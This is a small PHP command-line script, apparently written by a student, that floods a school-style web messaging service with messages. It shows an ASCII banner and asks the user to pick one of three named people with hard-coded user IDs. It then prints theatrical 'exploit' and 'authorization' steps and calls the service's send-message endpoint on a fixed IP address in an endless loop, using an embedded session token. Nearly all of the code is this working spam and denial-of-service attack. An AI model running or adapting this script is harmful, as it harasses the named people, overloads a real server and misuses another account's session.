<?php
	// Created by Nikita Aplin 09.09.2017 boost messages and crack web server, by uploading so hard files. VK: http://vk.com/aplinxy9plin
	echo "╔╗─╔╦═══╦════╦══╦══╦╗╔╦══╦══╦╗
	║╚═╝║╔══╩═╗╔═╣╔═╣╔═╣║║║╔╗║╔╗║║
	║╔╗─║╚══╗─║║─║╚═╣║─║╚╝║║║║║║║║
	║║╚╗║╔══╝─║║─╚═╗║║─║╔╗║║║║║║║║
	║║─║║╚══╗─║║─╔═╝║╚═╣║║║╚╝║╚╝║╚═╗
	╚╝─╚╩═══╝─╚╝─╚══╩══╩╝╚╩══╩══╩══╝
	╔══╦════╦════╦══╦══╦╗╔══╗
	║╔╗╠═╗╔═╩═╗╔═╣╔╗║╔═╣║║╔═╝
	║╚╝║─║║───║║─║╚╝║║─║╚╝║
	║╔╗║─║║───║║─║╔╗║║─║╔╗║
	║║║║─║║───║║─║║║║╚═╣║║╚═╗
	╚╝╚╝─╚╝───╚╝─╚╝╚╩══╩╝╚══╝\n";
	$x = true;
	echo "Кого спамим?(ФИ с заглавной буквы) ";
	$idArray = array('Аплин Никита' => 3748,
					'Богданов Евгений' => 3753,
					'Дубская Наталия' => 5094 );
	while(true){
		$handle = fopen ("php://stdin","r");
		$line = fgets($handle);
		$user_id = $idArray[trim($line)];
		if($user_id == NULL){
			echo "Такого не существует! Напиши реальное ФАМИЛИЮ и ИМЯ пользователя\n";
			/*for ($i=0; $i < 3; $i++) { 
				$pos = strpos($idArray[], $findme);
			}*/
		}else{
			echo "Thank you, continuing...\n";
			break;
		}
	}
	echo "User ID is ".$user_id."\n";
	echo "Connect https://top4ek.pw/exploit ...\n";
	sleep(2);
	echo "Authorization like a 'Аплин'...\n";
	sleep(3);
	echo "Updating cookie...\n";
	sleep(1);
	/*function signIn(){
		echo file_get_contents('http://78.140.18.5/webapi/auth/getdata');
	}*/
	function test($user_id){
		file_get_contents("http://78.140.18.5/asp/Messages/sendsavemsg.asp?LoginType=0&AT=211636405566331551299313&VER=1504959844&MID=&MBID=3&LTO=".$user_id."&LCC=&LBC=&TA=&NA=&PP=&DMID=&RT=&DESTINATION=&ShortAttach=1&EDITUSERID=3748&ATO=%D0%90%D0%BF%D0%BB%D0%B8%D0%BD+%D0%9D%D0%B8%D0%BA%D0%B8%D1%82%D0%B0+%D0%9B%D0%B8%D1%86%D0%B5%D0%B9+%E2%84%96+1+%D0%B8%D0%BC%D0%B5%D0%BD%D0%B8+%D0%90.%D0%A1.+%D0%9F%D1%83%D1%88%D0%BA%D0%B8%D0%BD...&ACC=&ABC=&SU=test&BO=test&STMSGREPORT=");
	}
	$i = 0;
	echo "Sent :      ";
	while(true){
		test($user_id);
		echo "\033[5D";
    		echo str_pad($i, 3, ' ', STR_PAD_LEFT) . " .";
	    	//sleep(0.1);           // wait for send request
	    	$i++;
	}
